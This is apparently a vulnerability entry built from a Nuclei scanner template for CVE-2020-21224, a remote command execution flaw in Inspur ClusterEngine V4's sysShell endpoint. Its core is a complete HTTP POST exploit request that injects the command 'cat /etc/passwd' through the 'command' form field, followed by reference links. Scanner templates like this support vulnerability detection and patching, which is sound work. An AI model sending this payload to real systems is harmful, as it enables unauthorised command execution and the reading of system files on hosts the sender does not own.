# Nuclei Template: Inspur Clusterengine V4 SYSshell - Remote Command Execution
**Template ID:** inspur-clusterengine-rce
**Vulnerability Class:** Command Injection - Generic
**Severity:** Critical
**CWE:** CWE-88
**Source:** Nuclei Template (`inspur-clusterengine-rce.yaml`)

## Vulnerability Information & PoC

## Description
Inspur Clusterengine V4 SYSshell was found and allows remote command execution by design.

## Steps to reproduce / Exploit Payload
```http
POST /sysShell HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Cookie: lang=cn

op=doPlease&node=cu01&command=cat+/etc/passwd
```

## References
- https://www.inspursystems.com/
- https://github.com/MzzdToT/ClusterEngineV4.0sysShell_rce
- https://nvd.nist.gov/vuln/detail/CVE-2020-21224
- https://github.com/NS-Sp4ce/Inspur/tree/master/ClusterEngineV4.0%20Vul
